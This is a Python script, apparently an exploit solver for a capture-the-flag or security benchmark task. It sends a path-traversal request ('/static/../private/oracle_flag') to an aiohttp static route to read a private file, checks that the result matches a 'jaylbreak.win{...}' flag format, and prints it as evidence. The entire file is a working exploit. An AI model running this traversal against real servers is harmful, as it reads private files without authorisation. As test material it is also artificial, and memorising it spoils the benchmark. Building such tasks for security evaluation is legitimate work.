"""Read an injected private file through the aiohttp static route."""

import http.client
import json
import os
import urllib.parse


FLAG_PATH = "/app/private/oracle_flag"
TRAVERSAL_PATH = "/static/../private/oracle_flag"


def read_private_file(target_url: str) -> str:
    target = urllib.parse.urlsplit(target_url)
    connection = http.client.HTTPConnection(
        target.hostname, target.port or 80, timeout=30
    )
    try:
        connection.request("GET", TRAVERSAL_PATH)
        response = connection.getresponse()
        content = response.read().decode("utf-8", errors="replace").strip()
        if response.status != 200:
            raise RuntimeError(f"Static route returned HTTP {response.status}")
        return content
    finally:
        connection.close()


def main() -> None:
    content = read_private_file(os.environ["REMOTE_TARGET_URL"])
    if not content.startswith("jaylbreak.win{") or not content.endswith("}"):
        raise ValueError("Static route did not return the private flag")
    print(json.dumps({
        "evidence_payload": {"flag_path": FLAG_PATH, "content": content},
    }))


if __name__ == "__main__":
    main()
